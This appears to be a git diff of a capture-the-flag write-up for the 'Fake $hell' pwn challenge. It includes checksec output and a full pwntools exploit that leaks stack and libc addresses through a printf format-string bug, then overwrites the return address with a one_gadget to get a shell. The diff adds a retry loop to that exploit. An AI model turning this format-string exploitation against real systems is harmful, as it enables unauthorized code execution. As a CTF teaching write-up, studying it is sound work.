@@ -1,7 +1,5 @@
 # Fake $hell
 
-![alt challenge](./fakeshell.jpg)
-
 ### Description
 ```
 While learning programming, I wrote a small fake terminal in C, it's very simple very few
@@ -10,12 +8,15 @@ It is accessible at: terminal.challs.shellmates.club:1337
 
 Goal: Prove you can escape from the fake shell to the real shell.
 ```
+![alt challenge](./fakeshell.jpg)
 ```
 pwndbg> checksec 
 RELRO           STACK CANARY      NX            PIE
 Partial RELRO   No canary found   NX enabled    PIE enabled
 ```
-Here is the ![Terminal](./terminal) binary and the ![libc](./libc-2.27.so) files.<br>
+#### How not to solve a pwn challenge
+
+Here is the ![Terminal](./terminal) binary and the ![libc](./libc-2.27.so) file.<br>
 When we connect using netcat and check the supported commands, we find these eight commands<br>
 ```
 mate@pwnable:/ $ help
@@ -39,57 +40,66 @@ and libc_start_main (the return address of main) to calculate the address of one
 ```python
 #!/usr/bin/env python2
 from pwn import *
+from time import sleep
 
-s = remote ('terminal.challs.shellmates.club', 1337)
 
 one_gadget_offset = 0xe87f5
 
-#leaking rbp and calculating the return address
-payload = 'printf %8$lp'
-s.sendline(payload)
-s.recvuntil('0x')
-ret  = int(s.recv(12), 16) - 0x418
-ret1 = p64(ret)
-ret2 = p64(ret + 2)
-ret3 = p64(ret + 4)
-log.info('return address: '+ str(hex(ret)))
+while True:
+    sleep(2)
+    try:
+        s = remote ('terminal.challs.shellmates.club', 1337)
+    except:
+        continue
+    #leaking rbp and calculating the return address
+    payload = 'printf %8$lp'
+    s.sendline(payload)
+    s.recvuntil('0x')
+    ret  = int(s.recv(12), 16) - 0x418
+    ret1 = p64(ret)
+    ret2 = p64(ret + 2)
+    ret3 = p64(ret + 4)
+    log.info('return address: '+ str(hex(ret)))
 
-#leaking libc_start_main address and calculating one gadget address
-payload = 'printf %141$lp'
-s.sendline(payload)
-s.recvuntil('0x')
-libc_start_main = int(s.recv(12), 16)
-one_gadget = libc_start_main + one_gadget_offset
-log.info('one gadget address: '+ str(hex(one_gadget)))
+    #leaking libc_start_main address and calculating one gadget address
+    payload = 'printf %141$lp'
+    s.sendline(payload)
+    s.recvuntil('0x')
+    libc_start_main = int(s.recv(12), 16)
+    one_gadget = libc_start_main + one_gadget_offset
+    log.info('one gadget address: '+ str(hex(one_gadget)))
 
-#calculating lenght for %n to overwrite the return address with one gadget
-length1 = (one_gadget & 0xffff) - 1
-length2 = (one_gadget >> 16 & 0xffff) - length1 -1
-length3 = (one_gadget >> 32 & 0xffff) - length1 - length2 -1
+    #calculating lenght for %n to overwrite the return address with one gadget
+    length1 = (one_gadget & 0xffff) - 1
+    length2 = (one_gadget >> 16 & 0xffff) - length1 -1
+    length3 = (one_gadget >> 32 & 0xffff) - length1 - length2 -1
 
-#to construct the address two bytes at the time, the lengths have to be from smaller to bigger
-if (length2 < 0) or (length3) < 0:
-    log.info('bad address, try again.')
-    exit()
+    #to construct the address two bytes at the time, the lengths have to be from smaller to bigger
+    if (length2 < 0) or (length3) < 0:
+        log.info('bad address, try again.')
+        s.close()
+        continue
 
 
-#overwriting the return address with one gadget address
-payload  = 'printf a'
-payload += '%' + str(length1) + 'd'
-payload += '%16$n'
-payload += '%' + str(length2) + 'd'
-payload += '%17$n'
-payload += '%' + str(length3) + 'd'
-payload += '%18$nh'
-payload  = payload.ljust(0x30, '\0')
-payload += ret1 + ret2 + ret3
+    #overwriting the return address with one gadget address
+    payload  = 'printf a'
+    payload += '%' + str(length1) + 'd'
+    payload += '%16$n'
+    payload += '%' + str(length2) + 'd'
+    payload += '%17$n'
+    payload += '%' + str(length3) + 'd'
+    payload += '%18$nh'
+    payload  = payload.ljust(0x30, '\0')
+    payload += ret1 + ret2 + ret3
 
-#the constraint of one gadget is [rsp+0x70] == NULL
-payload  = payload.ljust(0x400, '\0')
+    #the constraint of one gadget is [rsp+0x70] == NULL
+    payload  = payload.ljust(0x400, '\0')
 
-s.sendline(payload)
-s.interactive()
+    s.sendline(payload)
+    s.interactive()
+    s.close()
 ```
+Once we have a shell on the server, we find the source code files [terminal.c](./terminal.c) and [terminal.h](./terminal.h) and the flag!
 # Flag
 ```
 $ cat flag.txt
